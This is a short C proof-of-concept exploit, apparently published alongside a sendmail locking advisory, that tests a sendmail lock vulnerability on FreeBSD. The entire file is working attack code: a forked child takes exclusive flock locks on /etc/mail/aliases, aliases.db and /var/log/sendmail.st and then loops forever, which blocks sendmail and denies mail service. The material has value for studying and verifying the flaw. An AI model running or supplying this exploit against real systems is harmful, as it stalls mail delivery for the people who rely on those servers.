#include <fcntl.h>
#include <unistd.h>

/*

Stupid piece of code to test the sendmail lock vulnerability on
FreeBSD. Run this and try sendmail -t on FreeBSD for example.

More info: http://www.sendmail.org/LockingAdvisory.txt

zillion (at safemode.org && snosoft.com)
http://www.safemode.org
http://www.snosoft.com

*/

int main() {

  if(fork() == 0) {

    char *lock1 = "/etc/mail/aliases";
    char *lock2 = "/etc/mail/aliases.db";
    char *lock3 = "/var/log/sendmail.st";

    int fd;
    fd = open(lock1,O_RDONLY);
    flock(fd,0x02);

    fd = open(lock2,O_RDONLY);
    flock(fd,0x02);

    fd = open(lock3,O_RDONLY);
    flock(fd,0x02);

    /* We are here to stay! */

    for(;;) {}

  }
}

